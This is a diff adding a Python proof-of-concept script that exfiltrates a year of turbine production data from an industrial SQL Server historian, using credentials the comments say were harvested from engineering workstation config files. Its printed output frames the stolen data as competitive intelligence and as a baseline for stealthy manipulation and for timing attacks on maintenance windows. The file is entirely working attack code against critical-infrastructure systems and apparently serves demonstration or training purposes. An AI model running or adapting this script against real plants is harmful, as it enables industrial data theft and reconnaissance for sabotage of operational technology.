@@ -1,0 +1,91 @@
+#!/usr/bin/env python3
+"""
+Proof of Concept: Historian Data Exfiltration
+Demonstrates data extraction without disrupting operations
+"""
+
+import pyodbc
+import csv
+from datetime import datetime, timedelta
+
+
+def exfiltrate_production_data(historian_ip, days_back=365):
+    """
+    Extract production data from historian
+    This is READ-ONLY and does not affect operations
+    """
+
+    try:
+        # Connect to historian SQL Server
+        conn = pyodbc.connect(
+            f'DRIVER={{SQL Server}};SERVER={historian_ip};'
+            'DATABASE=Historian;UID=historian_readonly;PWD=readonly',
+            timeout=10
+            # Credentials found in engineering workstation config files
+        )
+
+        cursor = conn.cursor()
+
+        # Query production data
+        start_date = datetime.now() - timedelta(days=days_back)
+
+        query = """
+        SELECT timestamp, turbine_id, power_output_mw, efficiency_percent
+        FROM turbine_performance
+        WHERE timestamp > ?
+        ORDER BY timestamp
+        """
+
+        print(f"[*] Connecting to historian at {historian_ip}...")
+        print(f"[*] Querying last {days_back} days of data...")
+
+        cursor.execute(query, start_date)
+        rows = cursor.fetchall()
+
+        # Export to CSV for analysis
+        filename = f'exfiltrated_production_data_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
+        with open(filename, 'w', newline='') as f:
+            writer = csv.writer(f)
+            writer.writerow(['Timestamp', 'Turbine', 'Power (MW)', 'Efficiency (%)'])
+
+            record_count = 0
+            for row in rows:
+                writer.writerow(row)
+                record_count += 1
+
+        conn.close()
+
+        print(f"[*] Extracted {record_count} records")
+        print(f"[*] Data saved to {filename}")
+        print("\n[*] VALUE OF THIS DATA:")
+        print("    - Reveals production capacity and efficiency")
+        print("    - Identifies operational patterns and schedules")
+        print("    - Shows improvement trends over time")
+        print("    - Competitive intelligence worth €€€ to rivals")
+        print("    - Historical baselines enable stealthy manipulation")
+        print("    - Maintenance schedules reveal vulnerability windows")
+
+        return record_count
+
+    except pyodbc.Error as e:
+        print(f"[!] Database connection failed: {e}")
+        print("[!] This is expected if no historian database is available")
+        print("\n[*] In a real scenario, this would extract:")
+        print("    • Years of production data")
+        print("    • Efficiency metrics and trends")
+        print("    • Maintenance and downtime records")
+        print("    • Alarm histories and patterns")
+        print("    • Operational setpoint changes over time")
+        return 0
+    except Exception as e:
+        print(f"[!] Error during exfiltration: {e}")
+        return 0
+
+
+if __name__ == '__main__':
+    print("=" * 70)
+    print("[*] Proof of Concept: Historian Data Exfiltration")
+    print("[*] READ-ONLY demonstration - no operational impact")
+    print("=" * 70 + "\n")
+
+    exfiltrate_production_data('192.168.3.10')
